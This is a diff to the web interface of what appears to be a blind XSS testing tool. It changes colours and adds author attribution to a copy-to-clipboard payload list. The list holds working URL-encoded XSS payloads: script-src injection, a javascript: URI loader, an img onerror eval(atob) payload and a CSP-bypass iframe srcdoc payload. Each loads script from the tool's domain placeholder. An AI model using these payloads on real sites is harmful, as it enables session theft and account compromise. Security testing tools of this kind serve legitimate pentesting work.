@@ -32,11 +32,9 @@
             width: 85%;
         }
 
-
-
         .navbar {
             border-radius: 10px;
-            background-color: #4CAF50;
+            background-color: #004242;
             color: white;
             padding: 8px 5px;
             border: none;
@@ -44,7 +42,7 @@
         }
 
         .navbar:hover {
-            background-color: #45a049;
+            background-color: #003232;
         }
         
         .modal {
@@ -71,7 +69,7 @@
         }
 
         .action_button {
-            background-color: #007bff;
+            background-color: #367588;
             color: white;
             padding: 10px;
             border: none;
@@ -80,7 +78,8 @@
         }
 
         .action_button:hover {
-            background-color: #0056b3;
+            /* background-color: #0056b3; */
+            background-color: #2b4d4d;
         }
 
         .close_button {
@@ -160,6 +159,19 @@
             cursor: pointer;
         }
 
+        .payload_code:hover {
+            background-color: #272727;
+        }
+
+        .payload_author {
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .payload_author:hover {
+            color: #007bff;
+        }
+
         .modal_element_div {
             padding-top: 4px;
             padding-bottom: 4px;
@@ -223,7 +235,7 @@
     </div>
     <div id="payloads" hidden>
         <h1 style="margin-bottom:0px;">Payloads</h1>
-        <h3 style="margin:0px;">(Click Desired Payload to Copy to Clipboard)</h3>
+        <h3 style="margin:0px;">Click Desired Payload to Copy to Clipboard</h3>
         <div id="payloadsTable">
         </div>
     </div>
@@ -349,7 +361,8 @@
             var payloads = [
                 { title: 'Basic Payload', description: 'This is a basic payload', payload: '%3Cscript%20src%3D%27/script_domain/%27%3E%3C%2Fscript%3E' },
                 { title: 'Javascript URI', description: 'This is a payload that uses a javascript URI', payload: 'javascript%3Aeval%28%27var%20a%3Ddocument.createElement%28%5C%5C%27script%5C%5C%27%29%3Ba.src%3D%5C%5C%27/script_domain/%5C%5C%27%3Bdocument.body.appendChild%28a%29%27%29' },
-                { title: 'HTML Injection', description: 'This is a payload that uses HTML injection', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E' },
+                { title: 'IMG Error', description: 'Payload triggers on img error', payload: '%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28this.id%29%29%20id%3D%22/script_base64/%22%3E' },
+                { title: 'CSP Bypass', author: '@BRuteLogic', author_link: 'https://twitter.com/BRuteLogic', description: 'Payload against "script-src"', payload: '%3CIframe%20SrcDoc%3D%0A%22%3CScript%20Src%3D/script_domain/%3E%3C%2FScript%3E%22%3E'}
             ]
 
             payloads.forEach(payload => {
@@ -363,7 +376,12 @@
                 var URIPayload = decodeURIComponent(processedPayload);
                 var payloadDiv = make_div('payload_div', payloadsTable);
                 make_element('h2', payload.title, payloadDiv, 'payload_title');
-                make_element('p', payload.description, payloadDiv, 'payload_description');
+                var description = make_element('p', payload.description, payloadDiv, 'payload_description');
+                if (payload.author) {
+                    var author = make_element('p', `By ${payload.author} `, description, 'payload_author', function() {
+                        window.open(payload.author_link, '_blank');
+                    });
+                }
                 make_element('code', URIPayload, payloadDiv, 'payload_code', function() {
                     copyToClipboard(URIPayload);
                 });
